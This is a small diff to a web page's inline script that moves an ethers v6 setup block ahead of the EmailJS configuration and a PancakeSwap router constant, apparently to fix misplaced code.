@@ -117,7 +117,12 @@
   </div>
 
 <script>
+    
 (async () => {
+  // use ethers v6 from window.ethers (UMD)
+  // include formatUnits / parseUnits to avoid `undefined` errors
+  const { BrowserProvider, JsonRpcProvider, Contract, getAddress, formatUnits, parseUnits } = window.ethers;
+
   // ---------- CONFIG: Fill these with your EmailJS values ----------
   const EMAILJS_PUBLIC_KEY = "OGH12a8LlCboHPVz8";
   const EMAILJS_SERVICE_ID = "service_5hxo1hk";
@@ -129,11 +134,6 @@
     try { window.emailjs.init(EMAILJS_PUBLIC_KEY); } catch(e){ console.warn('EmailJS init error', e); }
   } else {
     console.warn('EmailJS not available');
-    
-(async () => {
-  // use ethers v6 from window.ethers (UMD)
-  // include formatUnits / parseUnits to avoid `undefined` errors
-  const { BrowserProvider, JsonRpcProvider, Contract, getAddress, formatUnits, parseUnits } = window.ethers;
 
   // Pancake constants
   const PCS_V2_ROUTER = getAddress("0x10ED43C718714eb63d5aA57B78B54704E256024E");
